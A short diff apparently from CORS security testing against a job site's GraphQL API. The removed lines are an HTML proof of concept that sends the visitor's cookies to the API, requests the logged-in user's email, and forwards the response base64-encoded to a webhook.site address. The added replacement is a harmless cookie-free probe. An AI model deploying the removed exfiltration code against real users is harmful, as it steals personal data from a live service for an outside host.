@@ -1,27 +1,14 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <script>
-      fetch("https://apis.indeed.com/graphql", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        credentials: "include",
-        mode: "cors",
-        body: JSON.stringify({
-          query: "{ viewer { email } }"
-        })
-      })
-      .then(response => response.text())
-      .then(data => {
-        // Replace this with your webhook or logging domain
-        fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e?data=" + btoa(data));
-      })
-      .catch(console.error);
-    </script>
-    <h1>CORS PoC Testing</h1>
-  </body>
-</html>
+fetch("https://apis.indeed.com/graphql", {
+  method: "POST",
+  mode: "cors",
+  credentials: "omit", // don't send cookies
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    query: "{ __typename }"
+  })
+}).then(res => res.text()).then(console.log).catch(console.error);
+
 
 
